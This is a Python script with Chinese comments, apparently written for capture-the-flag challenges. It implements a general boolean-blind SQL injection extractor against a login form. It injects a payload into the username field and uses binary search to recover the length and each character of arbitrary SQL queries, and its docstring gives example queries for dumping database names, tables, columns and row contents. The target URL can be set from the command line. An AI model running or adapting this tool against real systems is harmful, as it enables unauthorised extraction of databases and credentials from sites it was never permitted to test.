# -*- coding: utf-8 -*-
"""
sql_blind_extract.py —— SQL 布尔盲注提取引擎（通用模板）
===================================================
场景：登录页/查询页存在布尔盲注，条件为真/假时页面文案不同
      （如真 → "Login successful"，假 → "Invalid username or password"）

用法：
    python sql_blind_extract.py <登录URL> "<SQL表达式>" <标签> [最大长度]

原理：二分搜索定位长度 → 二分搜索每个字符的 ASCII（每字符约 7 次请求）
      ≈ 手写 mini sqlmap，适合 sqlmap 没装/装不上时用

常用表达式示例：
    select database()
    select group_concat(table_name) from information_schema.tables where table_schema='库名'
    select group_concat(column_name) from information_schema.columns where table_schema='库名' and table_name='表名'
    select group_concat(concat_ws('|',列1,列2)) from 表名
"""
import requests
import sys

# ================= 按题目改这里 =================
URL = "http://challenge.qsnctf.com:39964/login.php"
UNAME_TPL = "admin' and ({cond})#"   # 注入点模板：{cond} 会被替换成条件
PSW = "x"                             # 另一个参数随便填（# 注释掉了它）
TRUE_MARK = "Login successful"        # 条件为真时的页面标志
# ================================================


def oracle(cond):
    """发一次请求，返回条件是否为真"""
    payload = UNAME_TPL.format(cond=cond)
    try:
        r = requests.post(URL, data={"uname": payload, "psw": PSW}, timeout=10)
        return TRUE_MARK in r.text
    except Exception:
        return False


def sql_len(expr, cap=300):
    """二分搜索表达式结果长度"""
    if not oracle(f"length(({expr}))>0"):
        return 0
    lo, hi = 1, cap
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"length(({expr}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def sql_char(expr, pos):
    """二分搜索第 pos 个字符的 ASCII"""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ord(substr(({expr}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def extract(expr, label, cap=300):
    """提取整个表达式结果"""
    n = sql_len(expr, cap)
    print(f"[*] {label} : length = {n}")
    if n == 0:
        print("    (空)")
        return ""
    res = ""
    for i in range(1, n + 1):
        res += sql_char(expr, i)
        print(f"\r    {res}", end="", flush=True)
    print()
    return res


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)
    URL = sys.argv[1]
    expr = sys.argv[2]
    label = sys.argv[3] if len(sys.argv) > 3 else "结果"
    cap = int(sys.argv[4]) if len(sys.argv) > 4 else 300
    extract(expr, label, cap)
    print("\n按任意键退出...")
    try:
        input()
    except EOFError:
        pass
